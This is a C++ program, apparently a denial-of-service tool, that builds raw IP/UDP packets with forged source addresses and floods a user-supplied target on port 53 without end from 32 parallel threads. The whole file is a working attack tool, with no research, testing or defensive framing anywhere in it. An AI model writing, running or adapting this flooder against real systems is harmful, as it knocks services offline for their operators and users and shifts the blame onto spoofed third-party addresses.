#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <vector>
#include <cstdlib>
#include <sstream>

// Target info
const char *target_ip;
char spoofed_ip[16];
int target_port = 53;                   // Target port
int source_port = 8080;                 // Spoofed source port
struct udphdr *udp_header;
char packet[4096];
int message_len = 1400;  // Maximum UDP payload size
char message[1400];      // Create a buffer for the message
struct sockaddr_in dest_addr;

// Checksum function for IP header
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) 
{
    long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) 
    {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)~sum;

    return answer;
}

void generate_spoofed_ip(const std::string &base_ip)
{
    int random_octet = rand() % 256;
    snprintf(spoofed_ip, sizeof(spoofed_ip), "%s.%d", base_ip.c_str(), random_octet);
}

int SendSpoofedPackets(int threadnumber)
{
    struct iphdr *ip_header = (struct iphdr *)packet;

    // Create a raw socket outside the loop
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) 
    {
        perror("Socket creation failed");
        return 1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) 
    {
        perror("setsockopt() error");
        close(sock);
        return 1;
    }

    while (true)
    {
        generate_spoofed_ip(std::string(target_ip).substr(0, std::string(target_ip).rfind('.')));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + message_len);
        ip_header->id = htons(rand() % 65535);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr(spoofed_ip);
        ip_header->daddr = inet_addr(target_ip);

        ip_header->check = calculate_checksum((unsigned short *)ip_header, sizeof(struct iphdr));

        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), message, message_len);

        if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + message_len, 0,
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) 
        {
            perror("sendto() error");
        } 
    }
    close(sock);
    return 0;
}

int main() 
{

    std::string target_ip_input;
    std::cout << "Enter the target IP address Made My Charles Mortensen: ";
    std::cin >> target_ip_input;
    target_ip = strdup(target_ip_input.c_str());

    memset(packet, 0, 4096);
    udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    memset(message, 'A', message_len);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    dest_addr.sin_addr.s_addr = inet_addr(target_ip);

    std::cout << "Starting to send spoofed packets continuously..." << std::endl;

    udp_header->source = htons(source_port);
    udp_header->dest = htons(target_port);
    udp_header->len = htons(sizeof(struct udphdr) + message_len);
    udp_header->check = 0;

    const int num_threads = 32;
    std::vector<std::thread> threads;

    for (int i = 0; i < num_threads; ++i) 
    {
        threads.emplace_back(SendSpoofedPackets, i);
    }

    for (auto& th : threads) 
    {
        th.join();
    }

    std::cout << "All threads have finished execution." << std::endl;
  return 0;
  
  
}



